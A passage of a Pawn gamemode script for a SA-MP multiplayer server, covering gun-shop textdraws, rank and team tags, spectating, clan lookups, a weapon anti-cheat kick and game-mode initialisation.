	PlayerTextDrawLetterSize(p, td5[p], 0.264373, 1.045832);
	PlayerTextDrawAlignment(p, td5[p], 1);
	PlayerTextDrawColor(p, td5[p], -1);
	PlayerTextDrawSetShadow(p, td5[p], 0);
	PlayerTextDrawSetOutline(p, td5[p], 1);
	PlayerTextDrawBackgroundColor(p, td5[p], 51);
	PlayerTextDrawFont(p, td5[p], 1);
	PlayerTextDrawSetProportional(p, td5[p], 1);

	td6[p] = CreatePlayerTextDraw(p, 385.625000, 271.833282, "- Tir: 0~n~- DMG: 0~n~- Price: $0~n~- Accuracy: ~r~0%");
	PlayerTextDrawLetterSize(p, td6[p], 0.283122, 1.495000);
	PlayerTextDrawAlignment(p, td6[p], 1);
	PlayerTextDrawColor(p, td6[p], -1);
	PlayerTextDrawSetShadow(p, td6[p], 0);
	PlayerTextDrawSetOutline(p, td6[p], 1);
	PlayerTextDrawBackgroundColor(p, td6[p], 51);
	PlayerTextDrawFont(p, td6[p], 1);
	PlayerTextDrawSetProportional(p, td6[p], 1);

	td7[p] = CreatePlayerTextDraw(p, 393.750000, 383.833343, "Buy");
	PlayerTextDrawLetterSize(p, td7[p], 0.449999, 1.600000);
	PlayerTextDrawAlignment(p, td7[p], 1);
	PlayerTextDrawColor(p, td7[p], -1);
	PlayerTextDrawSetShadow(p, td7[p], 0);
	PlayerTextDrawSetOutline(p, td7[p], 1);
	PlayerTextDrawBackgroundColor(p, td7[p], 51);
	PlayerTextDrawFont(p, td7[p], 1);
	PlayerTextDrawSetProportional(p, td7[p], 1);

	td8[p] = CreatePlayerTextDraw(p, 387.500000, 380.333312, "LD_SPAC:white");
	PlayerTextDrawLetterSize(p, td8[p], 0.000000, 0.000000);
	PlayerTextDrawTextSize(p, td8[p], 108.125000, 23.916624);
	PlayerTextDrawAlignment(p, td8[p], 1);
	PlayerTextDrawColor(p, td8[p], -225902337);
	PlayerTextDrawSetShadow(p, td8[p], 0);
	PlayerTextDrawSetOutline(p, td8[p], 0);
	PlayerTextDrawFont(p, td8[p], 4);
	PlayerTextDrawSetSelectable(p, td8[p], true);

	td9[p] = CreatePlayerTextDraw(p, 225.750000, 166.000030, "usebox");
	PlayerTextDrawLetterSize(p, td9[p], 0.000000, 1.056017);
	PlayerTextDrawTextSize(p, td9[p], 98.000000, 0.000000);
	PlayerTextDrawAlignment(p, td9[p], 1);
	PlayerTextDrawColor(p, td9[p], -1162167740);
	PlayerTextDrawUseBox(p, td9[p], true);
	PlayerTextDrawBoxColor(p, td9[p], -2139062017);
	PlayerTextDrawSetShadow(p, td9[p], 0);
	PlayerTextDrawSetOutline(p, td9[p], 0);
	PlayerTextDrawFont(p, td9[p], 0);

	td10[p] = CreatePlayerTextDraw(p, 106.250000, 165.666610, "Choose category~n~~n~SMG ~>~~n~~n~Pistols ~>~~n~~n~Shotguns ~>~~n~~n~Rifles ~>~~n~~n~Extra ~>~");
	PlayerTextDrawLetterSize(p, td10[p], 0.331247, 0.964164);
	PlayerTextDrawAlignment(p, td10[p], 1);
	PlayerTextDrawColor(p, td10[p], -1);
	PlayerTextDrawSetShadow(p, td10[p], 0);
	PlayerTextDrawSetOutline(p, td10[p], 1);
	PlayerTextDrawBackgroundColor(p, td10[p], 51);
	PlayerTextDrawFont(p, td10[p], 1);
	PlayerTextDrawSetProportional(p, td10[p], 1);

	td11[p] = CreatePlayerTextDraw(p, 233.125000, 181.999984, "- First slot");
	PlayerTextDrawLetterSize(p, td11[p], 0.405624, 0.981666);
	PlayerTextDrawAlignment(p, td11[p], 1);
	PlayerTextDrawColor(p, td11[p], -1);
	PlayerTextDrawSetShadow(p, td11[p], 0);
	PlayerTextDrawSetOutline(p, td11[p], 1);
	PlayerTextDrawBackgroundColor(p, td11[p], 51);
	PlayerTextDrawFont(p, td11[p], 1);
	PlayerTextDrawSetProportional(p, td11[p], 1);

	td12[p] = CreatePlayerTextDraw(p, 232.250000, 199.333328, "- Second slot");
	PlayerTextDrawLetterSize(p, td12[p], 0.405624, 0.981666);
	PlayerTextDrawAlignment(p, td12[p], 1);
	PlayerTextDrawColor(p, td12[p], -1);
	PlayerTextDrawSetShadow(p, td12[p], 0);
	PlayerTextDrawSetOutline(p, td12[p], 1);
	PlayerTextDrawBackgroundColor(p, td12[p], 51);
	PlayerTextDrawFont(p, td12[p], 1);
	PlayerTextDrawSetProportional(p, td12[p], 1);

	td13[p] = CreatePlayerTextDraw(p, 232.000000, 214.333328, "- Third slot");
	PlayerTextDrawLetterSize(p, td13[p], 0.405624, 0.981666);
	PlayerTextDrawAlignment(p, td13[p], 1);
	PlayerTextDrawColor(p, td13[p], -1);
	PlayerTextDrawSetShadow(p, td13[p], 0);
	PlayerTextDrawSetOutline(p, td13[p], 1);
	PlayerTextDrawBackgroundColor(p, td13[p], 51);
	PlayerTextDrawFont(p, td13[p], 1);
	PlayerTextDrawSetProportional(p, td13[p], 1);

	td14[p] = CreatePlayerTextDraw(p, 232.375000, 229.333343, "- Fourth slot");
	PlayerTextDrawLetterSize(p, td14[p], 0.405624, 0.981666);
	PlayerTextDrawAlignment(p, td14[p], 1);
	PlayerTextDrawColor(p, td14[p], -1);
	PlayerTextDrawSetShadow(p, td14[p], 0);
	PlayerTextDrawSetOutline(p, td14[p], 1);
	PlayerTextDrawBackgroundColor(p, td14[p], 51);
	PlayerTextDrawFont(p, td14[p], 1);
	PlayerTextDrawSetProportional(p, td14[p], 1);

	td15[p] = CreatePlayerTextDraw(p, 101.250000, 181.416656, "LD_SPAC:white");
	PlayerTextDrawLetterSize(p, td15[p], 0.000000, 0.000000);
	PlayerTextDrawTextSize(p, td15[p], 122.500000, 14.000000);
	PlayerTextDrawAlignment(p, td15[p], 1);
	PlayerTextDrawColor(p, td15[p], 102);
	PlayerTextDrawSetShadow(p, td15[p], 0);
	PlayerTextDrawSetOutline(p, td15[p], 0);
	PlayerTextDrawBackgroundColor(p, td15[p], 51);
	PlayerTextDrawFont(p, td15[p], 4);
	PlayerTextDrawSetSelectable(p, td15[p], true);

	td16[p] = CreatePlayerTextDraw(p, 101.250000, 198.916687, "LD_SPAC:white");
	PlayerTextDrawLetterSize(p, td16[p], 0.000000, 0.000000);
	PlayerTextDrawTextSize(p, td16[p], 123.125000, 12.833343);
	PlayerTextDrawAlignment(p, td16[p], 1);
	PlayerTextDrawColor(p, td16[p], 85);
	PlayerTextDrawSetShadow(p, td16[p], 0);
	PlayerTextDrawSetOutline(p, td16[p], 0);
	PlayerTextDrawFont(p, td16[p], 4);
	PlayerTextDrawSetSelectable(p, td16[p], true);

	td17[p] = CreatePlayerTextDraw(p, 101.000000, 215.666671, "LD_SPAC:white");
	PlayerTextDrawLetterSize(p, td17[p], 0.000000, 0.000000);
	PlayerTextDrawTextSize(p, td17[p], 122.500000, 14.000000);
	PlayerTextDrawAlignment(p, td17[p], 1);
	PlayerTextDrawColor(p, td17[p], 102);
	PlayerTextDrawSetShadow(p, td17[p], 0);
	PlayerTextDrawSetOutline(p, td17[p], 0);
	PlayerTextDrawBackgroundColor(p, td17[p], 51);
	PlayerTextDrawFont(p, td17[p], 4);
	PlayerTextDrawSetSelectable(p, td17[p], true);

	td18[p] = CreatePlayerTextDraw(p, 100.750000, 233.583343, "LD_SPAC:white");
	PlayerTextDrawLetterSize(p, td18[p], 0.000000, 0.000000);
	PlayerTextDrawTextSize(p, td18[p], 122.500000, 14.000000);
	PlayerTextDrawAlignment(p, td18[p], 1);
	PlayerTextDrawColor(p, td18[p], 102);
	PlayerTextDrawSetShadow(p, td18[p], 0);
	PlayerTextDrawSetOutline(p, td18[p], 0);
	PlayerTextDrawBackgroundColor(p, td18[p], 51);
	PlayerTextDrawFont(p, td18[p], 4);
	PlayerTextDrawSetSelectable(p, td18[p], true);

	td19[p] = CreatePlayerTextDraw(p, 101.125000, 250.916748, "LD_SPAC:white");
	PlayerTextDrawLetterSize(p, td19[p], 0.000000, 0.000000);
	PlayerTextDrawTextSize(p, td19[p], 122.500000, 14.000000);
	PlayerTextDrawAlignment(p, td19[p], 1);
	PlayerTextDrawColor(p, td19[p], 102);
	PlayerTextDrawSetShadow(p, td19[p], 0);
	PlayerTextDrawSetOutline(p, td19[p], 0);
	PlayerTextDrawBackgroundColor(p, td19[p], 51);
	PlayerTextDrawFont(p, td19[p], 4);
	PlayerTextDrawSetSelectable(p, td19[p], true);

	td20[p] = CreatePlayerTextDraw(p, 230.875000, 181.333435, "LD_SPAC:white");
	PlayerTextDrawLetterSize(p, td20[p], 0.000000, 0.000000);
	PlayerTextDrawTextSize(p, td20[p], 122.500000, 14.000000);
	PlayerTextDrawAlignment(p, td20[p], 1);
	PlayerTextDrawColor(p, td20[p], 102);
	PlayerTextDrawSetShadow(p, td20[p], 0);
	PlayerTextDrawSetOutline(p, td20[p], 0);
	PlayerTextDrawBackgroundColor(p, td20[p], 51);
	PlayerTextDrawFont(p, td20[p], 4);
	PlayerTextDrawSetSelectable(p, td20[p], true);

	td21[p] = CreatePlayerTextDraw(p, 231.250000, 196.916748, "LD_SPAC:white");
	PlayerTextDrawLetterSize(p, td21[p], 0.000000, 0.000000);
	PlayerTextDrawTextSize(p, td21[p], 122.500000, 14.000000);
	PlayerTextDrawAlignment(p, td21[p], 1);
	PlayerTextDrawColor(p, td21[p], 102);
	PlayerTextDrawSetShadow(p, td21[p], 0);
	PlayerTextDrawSetOutline(p, td21[p], 0);
	PlayerTextDrawBackgroundColor(p, td21[p], 51);
	PlayerTextDrawFont(p, td21[p], 4);
	PlayerTextDrawSetSelectable(p, td21[p], true);

	td22[p] = CreatePlayerTextDraw(p, 231.625000, 211.916732, "LD_SPAC:white");
	PlayerTextDrawLetterSize(p, td22[p], 0.000000, 0.000000);
	PlayerTextDrawTextSize(p, td22[p], 122.500000, 14.000000);
	PlayerTextDrawAlignment(p, td22[p], 1);
	PlayerTextDrawColor(p, td22[p], 102);
	PlayerTextDrawSetShadow(p, td22[p], 0);
	PlayerTextDrawSetOutline(p, td22[p], 0);
	PlayerTextDrawBackgroundColor(p, td22[p], 51);
	PlayerTextDrawFont(p, td22[p], 4);
	PlayerTextDrawSetSelectable(p, td22[p], true);

	td23[p] = CreatePlayerTextDraw(p, 230.125000, 227.500091, "LD_SPAC:white");
	PlayerTextDrawLetterSize(p, td23[p], 0.000000, 0.000000);
	PlayerTextDrawTextSize(p, td23[p], 122.500000, 14.000000);
	PlayerTextDrawAlignment(p, td23[p], 1);
	PlayerTextDrawColor(p, td23[p], 102);
	PlayerTextDrawSetShadow(p, td23[p], 0);
	PlayerTextDrawSetOutline(p, td23[p], 0);
	PlayerTextDrawBackgroundColor(p, td23[p], 51);
	PlayerTextDrawFont(p, td23[p], 4);
	PlayerTextDrawSetSelectable(p, td23[p], true);

    td24[p] = CreatePlayerTextDraw(p, 486.875000, 107.916664, "x");
	PlayerTextDrawLetterSize(p, td24[p], 0.449999, 1.600000);
	PlayerTextDrawAlignment(p, td24[p], 1);
	PlayerTextDrawColor(p, td24[p], -1);
	PlayerTextDrawSetShadow(p, td24[p], 0);
	PlayerTextDrawSetOutline(p, td24[p], 1);
	PlayerTextDrawBackgroundColor(p, td24[p], 51);
	PlayerTextDrawFont(p, td24[p], 1);
	PlayerTextDrawSetProportional(p, td24[p], 1);
	PlayerTextDrawSetSelectable(p, td24[p], true);


return 1;
}
GetRank(playerid)
{
	new str1[256];
	if (PlayerInfo[playerid][pKills] >= 0 && PlayerInfo[playerid][pKills] <= 10) str1 = ("{5af92a}[TazeVared]");
	if (PlayerInfo[playerid][pKills] >= 10 && PlayerInfo[playerid][pKills] <= 20) str1 = ("{5af92a}[NooBKiller]");
	if (PlayerInfo[playerid][pKills] >= 20 && PlayerInfo[playerid][pKills] <= 30) str1 = ("{5af92a}[MasterMurder]");
	if (PlayerInfo[playerid][pKills] >= 30 && PlayerInfo[playerid][pKills] <= 50) str1 = ("{5af92a}[Kabose-Shab]");
	if (PlayerInfo[playerid][pKills] >= 50 && PlayerInfo[playerid][pKills] <= 200) str1 = ("{5af92a}[AmazinG-Killer]");
	if (PlayerInfo[playerid][pVip] == 1) str1 = ("{92abd3}[VIP] ");
	if (PlayerInfo[playerid][pAdmin] >= 1 && PlayerInfo[playerid][pAdmin] >= 5 ) str1 = ("{ffe900}[ADMIN] ");
	if (PlayerInfo[playerid][pAdmin] >= 6 && PlayerInfo[playerid][pAdmin] >= 7 ) str1 = ("{c058e2}[OWNER] ");
	if (PlayerInfo[playerid][pAdmin] == 8) str1 = ("{7478b2}[ModirMali] ");
	if (PlayerInfo[playerid][pAdmin] >= 10) str1 = ("{58e29a}[MalekAsli] ");
	
	return str1;
}
stock GetTeam(playerid)
{
	new str[256];
	if(MapChange == 0){
	if (gteam[playerid] == 1) str = ("{4286f4}[Counter-Terrorist]");
	if (gteam[playerid] == 2) str = ("{ef413e}[Terrorist]");
	} else if(MapChange == 1){
	if (gteam[playerid] == 1) str = ("{4286f4}[Human]");
	if (gteam[playerid] == 2) str = ("{ef413e}[Zombie]");
	} else if(MapChange == 2){
	if (gteam[playerid] == 1) str = ("{4286f4}[Sniper-1]");
	if (gteam[playerid] == 2) str = ("{ef413e}[Sniper-2]");
	}	else if(MapChange == 3){
	if (gteam[playerid] == 1) str = ("{4286f4}[Taliban]");
	if (gteam[playerid] == 2) str = ("{ef413e}[Isis]");
	}
	else if(MapChange == 4){
	if (gteam[playerid] == 1) str = ("{4286f4}[Team-1]");
	if (gteam[playerid] == 2) str = ("{ef413e}[Team-2]");
	}
	else if(MapChange == 5){
	if (gteam[playerid] == 1) str = ("{4286f4}[Team-1]");
	if (gteam[playerid] == 2) str = ("{ef413e}[Team-2]");
	}
	return str;
}
forward SpectateOn(playerid);
public SpectateOn(playerid)
{
        TogglePlayerSpectating(playerid, 1);
        for(new i=0; i<MAX_PLAYERS; i++)
        {
            if(!IsPlayerConnected(i)) continue;
            SpectatedPlayer[playerid] = i;
                PlayerSpectatePlayer(playerid, i);
        }
        IsPlayerSpectating[playerid] = true;
        new str[128];
        format(str, 128, "Specd to %s (ID:%d).", GetName(SpectatedPlayer[playerid]), SpectatedPlayer[playerid]);
        SendClientMessage(playerid, colorSPECTATE, str);
}

forward SpectateOff(playerid);
public SpectateOff(playerid)
{
        TogglePlayerSpectating(playerid, 0);
        SpectatedPlayer[playerid] = 0;
        IsPlayerSpectating[playerid] = false;
       
}

forward SpectateNext(playerid);
public SpectateNext(playerid)
{
        SpectatedPlayer[playerid]++;
        for(new i=SpectatedPlayer[playerid]; i<MAX_PLAYERS; i++)
        {
                if(!IsPlayerConnected(i)) continue;
                if(IsPlayerInAnyVehicle(i))
                {
                        PlayerSpectateVehicle(playerid, GetPlayerVehicleID(i));
                }
                else
                {
                        PlayerSpectatePlayer(playerid, i);
                }
                SpectatedPlayer[playerid] = i;
                break;
        }
        new str[128];
        format(str, 128, "Speced to %s (ID:%d).", GetName(SpectatedPlayer[playerid]), SpectatedPlayer[playerid]);
        SendClientMessage(playerid, colorSPECTATE, str);
}

forward SpectatePrevious(playerid);
public SpectatePrevious(playerid)
{
    SpectatedPlayer[playerid]--;
        for(new i=SpectatedPlayer[playerid]; i>-1; i--)
        {
                if(!IsPlayerConnected(i)) continue;
                if(IsPlayerInAnyVehicle(i))
                {
                        PlayerSpectateVehicle(playerid, GetPlayerVehicleID(i));
                }
                else
                {
                        PlayerSpectatePlayer(playerid, i);
                }
                SpectatedPlayer[playerid] = i;
                break;
        }
        new str[128];
        format(str, 128, "Spec to %s (ID:%d).", GetName(SpectatedPlayer[playerid]), SpectatedPlayer[playerid]);
        SendClientMessage(playerid, colorSPECTATE, str);
}

stock GetName(i)
{
        new name[24];
        GetPlayerName(i, name, 24);
        return name;
}
public ps(playerid)
{
					nps[playerid]++;
                    if(nps[playerid] >= 3) Kick(playerid);
                    ShowPlayerDialog(playerid, DIALOG_LOGIN, DIALOG_STYLE_INPUT,""COL_WHITE"Login",""COL_RED"You have entered an incorrect password.\n"COL_WHITE"Type your password below to login.","Login","Quit");
                    return 1;
}
GetClanTag(playerid)
{
	new str[128]; new ctpath[128]; format(ctpath, sizeof(ctpath),"/clans/%d.ini",PlayerInfo[playerid][pClan]);
 	if(PlayerInfo[playerid][pClan] == 0) str = ("");
 	else
 	format(str, sizeof(str),"[%s]",dini_Get(ctpath, "Tag"));
	return str;
}
stock SendGroupMessage(groupid,text[])
{
    for(new i = 0; i < MAX_PLAYERS; i++)
    {
        if(IsPlayerConnected(i)){
        if(PlayerInfo[i][pClan] == groupid)
        {
            SendClientMessage(i, COLOR_LIME, text);
        }
			}
    }
    return 1;
}
GetGroupRank(playerid)
{
    	new str[128]; new ctpath[128]; format(ctpath, sizeof(ctpath),"/clans/%d.ini",PlayerInfo[playerid][pClan]);
    	if(PlayerInfo[playerid][pRank] == 1) format(str, sizeof(str),"%s",dini_Get(ctpath, "Rank"));
 		if(PlayerInfo[playerid][pRank] == 2) format(str, sizeof(str),"%s",dini_Get(ctpath, "Rank1"));
		if(PlayerInfo[playerid][pRank] == 3) format(str, sizeof(str),"%s",dini_Get(ctpath, "Rank2"));
		if(PlayerInfo[playerid][pRank] == 4) format(str, sizeof(str),"%s",dini_Get(ctpath, "Rank3"));
		if(PlayerInfo[playerid][pRank] == 5) format(str, sizeof(str),"%s",dini_Get(ctpath, "Rank4"));
	return str;
}
MaxAmmo(playerid)
{
	new slot, weap, ammo;
	for (slot = 0; slot < 14; slot++)
	{
    	GetPlayerWeaponData(playerid, slot, weap, ammo);
		   	GivePlayerWeaponEx(playerid, weap, 99999);
	}
	return 1;
}
public SendClientMessageToNearPlayers(playerid,text[])
{
new Float:x,Float:y,Float:z;
new string[512];

GetPlayerPos(playerid, x, y, z);
for(new i=0; i<GetMaxPlayers(); i++)
{
   if(IsPlayerConnected(i))
   {
  if(IsPlayerInRangeOfPoint(i, 20.00, x, y, z)) 
      {
		format(string, sizeof(string), text);
		SendClientMessage(i, COLOR_GREEN, string);
      }
   }
}
			return 1;
}
forward Usedrugs(playerid);
public Usedrugs(playerid)
{
	SetPlayerWeather(playerid, 2);
	return 1;
}
public bebakhashkhodamano()
{
	if(MapChange == 5){
	for(new i=0;i<=MAX_PLAYERS;i++)
	{
	    if(bedamjetpack[i] == false) return 1;
		if(IsPlayerConnected(i)) SetPlayerSpecialAction(i,SPECIAL_ACTION_USEJETPACK);
	}
	}
	return 1;
}
enum weapons
{
	Melee,
	Thrown,
	Pistols,
	Shotguns,
	SubMachine,
	Assault,
	Rifles,
	Heavy,
	Handheld,

}
new Weapons[MAX_PLAYERS][weapons];
CheckWeapons(playerid)
{
	new weaponid = GetPlayerWeapon(playerid);

 	if(weaponid >= 2 && weaponid <= 15)
 	{
 		if(weaponid == Weapons[playerid][Melee])
 		{
 		return 1;
 		}
			else
 			{
			SendClientMessage(playerid, 0xFF0000FF, "Weapon Hack? bay bay :D");
 			Kick(playerid);
 			}
	}

		if( weaponid >= 16 && weaponid <= 18 || weaponid == 39 ) 
 	{
 		if(weaponid == Weapons[playerid][Thrown])
 		{
 		return 1;
 		}
			else
 			{
			SendClientMessage(playerid, 0xFF0000FF, "Weapon Hack? bay bay :D");
 			Kick(playerid);
 			}
	}
	if( weaponid >= 22 && weaponid <= 24 ) 
 	{
 		if(weaponid == Weapons[playerid][Pistols])
 		{
 		return 1;
 		}
			else
 			{
			SendClientMessage(playerid, 0xFF0000FF, "Weapon Hack? bay bay :D");
 			Kick(playerid);
 			}
	}

	if( weaponid >= 25 && weaponid <= 27 ) 
 	{
 		if(weaponid == Weapons[playerid][Shotguns])
 		{
 		return 1;
 		}
			else
 			{
			SendClientMessage(playerid, 0xFF0000FF, "Weapon Hack? bay bay :D");
 			Kick(playerid);
 			}
	}
	if( weaponid == 28 || weaponid == 29 || weaponid == 32 ) 
 	{
 		if(weaponid == Weapons[playerid][SubMachine])
 		{
 		return 1;
 		}
			else
 			{
			SendClientMessage(playerid, 0xFF0000FF, "Weapon Hack? bay bay :D");
 			Kick(playerid);
 			}
	}

	if( weaponid == 30 || weaponid == 31 ) 
 	{
 		if(weaponid == Weapons[playerid][Assault])
 		{
 		return 1;
 		}
			else
 			{
			SendClientMessage(playerid, 0xFF0000FF, "Weapon Hack? bay bay :D");
 			Kick(playerid);
 			}
	}

	if( weaponid == 33 || weaponid == 34 ) 
 	{
 		if(weaponid == Weapons[playerid][Rifles])
 		{
 		return 1;
 		}
			else
 			{
			SendClientMessage(playerid, 0xFF0000FF, "Weapon Hack? bay bay :D");
 			Kick(playerid);
 			}
	}
	if( weaponid >= 35 && weaponid <= 38 ) 
 	{
 		if(weaponid == Weapons[playerid][Heavy])
 		{
 		return 1;
 		}
			else
 			{
			SendClientMessage(playerid, 0xFF0000FF, "Weapon Hack? bay bay :D");
 			Kick(playerid);
 			}
	}
	else { return 1; }

return 1;
}
GivePlayerWeaponEx(playerid, weaponid, ammo)
{
if(weaponid >= 1 && weaponid <= 15)
 	{
	Weapons[playerid][Melee] = weaponid;
	GivePlayerWeapon(playerid, weaponid, ammo);
	return 1;
	}

		if( weaponid >= 16 && weaponid <= 18 || weaponid == 39 ) 
 	{
	Weapons[playerid][Thrown] = weaponid;
	GivePlayerWeapon(playerid, weaponid, ammo);
	return 1;
	}
	if( weaponid >= 22 && weaponid <= 24 ) 
 	{
	Weapons[playerid][Pistols] = weaponid;
	GivePlayerWeapon(playerid, weaponid, ammo);
	return 1;
	}

	if( weaponid >= 25 && weaponid <= 27 ) 
 	{
	Weapons[playerid][Shotguns] = weaponid;
	GivePlayerWeapon(playerid, weaponid, ammo);
	return 1;
	}
	if( weaponid == 28 || weaponid == 29 || weaponid == 32 ) 
 	{
	Weapons[playerid][SubMachine] = weaponid;
	GivePlayerWeapon(playerid, weaponid, ammo);
	return 1;
	}

	if( weaponid == 30 || weaponid == 31 ) 
 	{
	Weapons[playerid][Assault] = weaponid;
	GivePlayerWeapon(playerid, weaponid, ammo);
	return 1;
	}

	if( weaponid == 33 || weaponid == 34 ) 
 	{
	Weapons[playerid][Rifles] = weaponid;
	GivePlayerWeapon(playerid, weaponid, ammo);
	return 1;
	}
	if( weaponid >= 35 && weaponid <= 38 ) 
 	{
	Weapons[playerid][Heavy] = weaponid;
	GivePlayerWeapon(playerid, weaponid, ammo);
	return 1;
	}
return 1;
}
public attachweapon(playerid)
{
    	new gun = GetPlayerWeapon(playerid);
				if(gun == 3 )
				{

					SetPlayerAttachedObject( playerid, 5, 334, 8, 0.050000, -0.034000, 0.085000, 80.000000, 60.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); 
				}
				else if(gun == 24 )
				{
                    SetPlayerAttachedObject( playerid, 6, 348, 8, 0.250000, -0.034000, 0.137999, 80.000000, 180.000000, 185.000000, 1.000000, 1.000000, 1.000000 ); 

	            }
				else if(gun == 29 )
				{
				    SetPlayerAttachedObject( playerid, 7, 353, 1, -0.300000, -0.150000, 0.119999, 0.000000, 30.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); 
				}
                else if(gun == 25 )
				{
				    SetPlayerAttachedObject( playerid, 8, 349, 1, -0.300000, -0.119999, -0.119999, 180.000000, 10.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); 
				}
                else if(gun == 4 )
				{
				    SetPlayerAttachedObject( playerid, 5, 335, 8, 0.050000, -0.034000, 0.085000, 80.000000, 60.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); 
				}
   				else if(gun == 23 )
				{
				    SetPlayerAttachedObject( playerid, 6, 347, 8, 0.250000, -0.034000, 0.137999, 80.000000, 180.000000, 185.000000, 1.000000, 1.000000, 1.000000 ); 
	            }
                else if(gun == 30 )
				{
				    SetPlayerAttachedObject( playerid, 8, 355, 1, -0.300000, -0.119999, -0.119999, 180.000000, 10.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); 
	            }
                else if(gun == 31 )
				{
				    SetPlayerAttachedObject( playerid, 8, 356, 1, -0.300000, -0.119999, -0.119999, 180.000000, 10.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); 
	            }
                else if(gun == 34 )
				{
				    SetPlayerAttachedObject( playerid, 8, 358, 1, -0.300000, -0.119999, -0.119999, 180.000000, 10.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); 
	            }
                else if(gun == 33 )
				{
				    SetPlayerAttachedObject( playerid, 8, 357, 1, -0.300000, -0.119999, -0.119999, 180.000000, 10.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); 
	            }
	            return 1;
}
main()
{
	print("\n----------------------------------");
	print("Tdm/Dm/Minigames By Unix");
	print("----------------------------------\n");
}

public OnGameModeInit()
{
	SetTimer("bebakhashkhodamano",2000,true);
    SetTimer("ChangeColor", 1000, true);
	format(Amar1Text, sizeof(Amar1Text), "~G~>> ~B~[ServeR] ~r~~h~Welcome");
	format(Amar2Text, sizeof(Amar2Text), "~G~>> ~B~[ServeR] ~r~~h~Omidvarim Lahazat Khobi Ra Dar In Server Dashte Bashid");
	format(Amar3Text, sizeof(Amar3Text), "~G~>> ~B~[Scripter] ~r~~h~Unix");
	tdn = TextDrawCreate(510.000000, 435.000000, "[IR]Minigames");
	tdrw0 = TextDrawCreate(549.000000, 250.000000, "Stats");
TextDrawAlignment(tdrw0, 3);
TextDrawBackgroundColor(tdrw0, 255);
TextDrawFont(tdrw0, 1);
TextDrawLetterSize(tdrw0, 0.500000, 1.000000);
TextDrawColor(tdrw0, -1);
TextDrawSetOutline(tdrw0, 0);
TextDrawSetProportional(tdrw0, 1);
TextDrawSetShadow(tdrw0, 1);
TextDrawSetSelectable(tdrw0, 0);

tdrw1 = TextDrawCreate(488.000000, 269.000000, "Accounts:");
TextDrawAlignment(tdrw1, 2);
TextDrawBackgroundColor(tdrw1, 255);
TextDrawFont(tdrw1, 1);
TextDrawLetterSize(tdrw1, 0.500000, 1.000000);
TextDrawColor(tdrw1, -1);
TextDrawSetOutline(tdrw1, 0);
TextDrawSetProportional(tdrw1, 1);
TextDrawSetShadow(tdrw1, 1);
TextDrawSetSelectable(tdrw1, 0);

tdrw2 = TextDrawCreate(519.000000, 285.000000, "Bans:");
TextDrawAlignment(tdrw2, 3);
TextDrawBackgroundColor(tdrw2, 255);
TextDrawFont(tdrw2, 1);
TextDrawLetterSize(tdrw2, 0.500000, 1.000000);
TextDrawColor(tdrw2, -1);
TextDrawSetOutline(tdrw2, 0);
	 bg = TextDrawCreate(0.0000, 0.0000, "loadsc2:loadsc2");
        TextDrawLetterSize(bg, 0.000000, 0.000000);
        TextDrawTextSize(bg, 640.0000, 480.0000);
        TextDrawAlignment(bg, 1);
        TextDrawSetShadow(bg, 0);
        TextDrawSetOutline(bg, 0);
        TextDrawFont(bg, 4);
    for(new i; i < MAX_PLAYERS; i ++)
    {
        if(IsPlayerConnected(i))
        {
            TextDrawShowForPlayer(i, Don);
        }
    }
TextDrawBackgroundColor(tdn, 255);
TextDrawFont(tdn, 1);
TextDrawLetterSize(tdn, 0.500000, 1.000000);
TextDrawColor(tdn, -1);
TextDrawSetOutline(tdn, 0);
TextDrawSetProportional(tdn, 1);
TextDrawSetShadow(tdn, 1);
TextDrawSetSelectable(tdn, 0);
gzones[1] = GangZoneCreate(-1559.5, 2536, -1391.5, 2686);
gzones[2] = GangZoneCreate(-115.5, 2414, 468.5, 2576);


Gunstxd[0] = TextDrawCreate(1.200019, -2.640007, "box");
TextDrawLetterSize(Gunstxd[0], 0.000000, 45.999961);
TextDrawTextSize(Gunstxd[0], 639.000000, 0.000000);
TextDrawAlignment(Gunstxd[0], 1);
TextDrawColor(Gunstxd[0], 842137700);
TextDrawUseBox(Gunstxd[0], 1);
TextDrawBoxColor(Gunstxd[0], -16777096);
TextDrawSetShadow(Gunstxd[0], 0);
TextDrawSetOutline(Gunstxd[0], 0);
TextDrawBackgroundColor(Gunstxd[0], 255);
TextDrawFont(Gunstxd[0], 1);
TextDrawSetProportional(Gunstxd[0], 1);
TextDrawSetShadow(Gunstxd[0], 0);

Gunstxd[1] = TextDrawCreate(356.399871, 1.840012, "Guns");
TextDrawLetterSize(Gunstxd[1], 1.429600, 4.056531);
TextDrawAlignment(Gunstxd[1], 3);
TextDrawColor(Gunstxd[1], 16711935);
TextDrawSetShadow(Gunstxd[1], 1);
TextDrawSetOutline(Gunstxd[1], 0);
TextDrawBackgroundColor(Gunstxd[1], 255);
TextDrawFont(Gunstxd[1], 0);
TextDrawSetProportional(Gunstxd[1], 1);
TextDrawSetShadow(Gunstxd[1], 1);

Gunstxd[2] = TextDrawCreate(44.400009, 119.066680, "box");
TextDrawLetterSize(Gunstxd[2], 0.000000, 10.239999);
TextDrawTextSize(Gunstxd[2], 202.000000, 0.000000);
TextDrawAlignment(Gunstxd[2], 1);
TextDrawColor(Gunstxd[2], -1);
TextDrawUseBox(Gunstxd[2], 1);
TextDrawBoxColor(Gunstxd[2], 40);
TextDrawSetShadow(Gunstxd[2], 0);
TextDrawSetOutline(Gunstxd[2], 0);
TextDrawBackgroundColor(Gunstxd[2], 255);
TextDrawFont(Gunstxd[2], 1);
TextDrawSetProportional(Gunstxd[2], 1);
TextDrawSetShadow(Gunstxd[2], 0);

Gunstxd[3] = TextDrawCreate(245.199996, 119.813346, "box");
TextDrawLetterSize(Gunstxd[3], 0.000000, 10.239999);
TextDrawTextSize(Gunstxd[3], 404.000000, 0.000000);
TextDrawAlignment(Gunstxd[3], 1);
TextDrawColor(Gunstxd[3], -1);
TextDrawUseBox(Gunstxd[3], 1);
TextDrawBoxColor(Gunstxd[3], 40);
TextDrawSetShadow(Gunstxd[3], 0);
TextDrawSetOutline(Gunstxd[3], 0);
TextDrawBackgroundColor(Gunstxd[3], 255);
TextDrawFont(Gunstxd[3], 1);
TextDrawSetProportional(Gunstxd[3], 1);
TextDrawSetShadow(Gunstxd[3], 0);

